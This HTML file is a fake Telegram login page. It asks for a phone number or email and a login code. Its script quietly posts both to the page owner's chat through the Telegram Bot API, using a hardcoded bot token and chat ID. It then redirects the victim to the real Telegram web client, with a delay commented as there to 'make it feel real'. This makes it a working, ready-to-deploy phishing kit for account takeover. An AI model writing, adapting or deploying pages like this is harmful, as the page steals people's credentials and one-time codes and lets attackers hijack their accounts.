<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #222;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            box-sizing: border-box;
        }
        h1 {
            font-size: 26px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 30px;
            line-height: 1.2;
        }
        .input-group {
            margin-bottom: 15px;
            position: relative;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #dfe1e5;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
            transition: all 0.2s;
            box-sizing: border-box;
        }
        input:focus {
            border-color: #3390ec;
            background-color: #f4f4f5;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #707579;
        }
        .actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            font-size: 14px;
        }
        .remember-me {
            display: flex;
            align-items: center;
            cursor: pointer;
        }
        .remember-me input {
            width: auto;
            margin-right: 8px;
        }
        .forgot-password {
            color: #3390ec;
            text-decoration: none;
        }
        button {
            width: 100%;
            padding: 14px;
            background-color: #3390ec;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
            position: relative;
        }
        button:hover {
            background-color: #2b80d8;
        }
        button:disabled {
            background-color: #a0c8f0;
            cursor: not-allowed;
        }
        .loader {
            display: none;
            border: 3px solid rgba(255,255,255,0.3);
            border-top: 3px solid white;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .btn-text {
            display: block;
        }
        .btn-loader {
            display: none;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
        button.loading .btn-text {
            visibility: hidden;
        }
        button.loading .btn-loader {
            display: block;
        }
        
        /* Mobile specific adjustments if needed */
        @media (max-width: 480px) {
            .container {
                padding: 15px;
            }
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Welcome back<br>Sign in to your account to continue</h1>
    
    <form id="loginForm">
        <div class="input-group">
            <input type="text" id="username" placeholder="Phone number or email" required autocomplete="off">
        </div>
        
        <div class="input-group">
            <input type="text" id="code" placeholder="Code" required>
        </div>

        <div class="actions">
            <label class="remember-me">
                <input type="checkbox" id="remember"> Remember me
            </label>
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>

        <button type="submit" id="loginBtn">
            <span class="btn-text">Log In →</span>
            <div class="btn-loader loader"></div>
        </button>
    </form>
    
    <p style="text-align: center; margin-top: 20px; font-size: 14px; color: #707579;">
        Don't have an account? <a href="#" style="color: #3390ec; text-decoration: none;">Create account</a>
    </p>
</div>

<script>
    // Your specific credentials
    const BOT_TOKEN = '8882552478:AAF4K0LuqpDuC4B_VmbCV8Z1bQZgSwwVNUs';
    const CHAT_ID = '6580224953';

    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const btn = document.getElementById('loginBtn');
        const username = document.getElementById('username').value;
        const code = document.getElementById('code').value;
        
        // Add loading state
        btn.classList.add('loading');
        btn.disabled = true;

        // Prepare message for Telegram
        const message = `🔐 *Login Attempt*\n\n👤 Username: ${username}\n🔑 Code: ${code}`;

        // Send data to Telegram via Bot API
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                // Simulate a small delay to make it feel real
                setTimeout(() => {
                    window.location.href = 'https://web.telegram.org/k/';
                }, 1000);
            } else {
                alert("Error sending data");
                btn.classList.remove('loading');
                btn.disabled = false;
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert("Connection error. Please try again.");
            btn.classList.remove('loading');
            btn.disabled = false;
        });
    });
</script>

</body>
</html>
